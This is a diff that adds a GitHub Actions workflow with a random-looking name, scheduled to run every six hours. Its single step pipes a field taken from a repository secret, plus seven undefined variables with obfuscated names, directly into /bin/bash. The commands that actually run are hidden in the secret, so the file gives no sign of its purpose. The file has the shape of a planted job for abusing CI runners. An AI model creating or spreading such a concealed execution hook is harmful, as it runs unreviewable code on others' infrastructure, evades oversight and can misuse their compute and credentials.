@@ -1,0 +1,24 @@
+name: termsphonetic
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: termsphonetic
+        env:
+          ets6449: ${{ secrets.ets6449 }}
+        run: |
+          echo $ets6449 | jq -r .cxqua124 | /bin/bash
+          echo $ekz895 | jq -r .uvys1 | /bin/bash
+          echo $vumhl4 | jq -r .m2665 | /bin/bash
+          echo $z46372 | jq -r .h14 | /bin/bash
+          echo $zdi884 | jq -r .ca4 | /bin/bash
+          echo $qcz76 | jq -r .yr9470 | /bin/bash
+          echo $a11967 | jq -r .khq3 | /bin/bash
+          echo $fthh0 | jq -r .oajk53 | /bin/bash
+
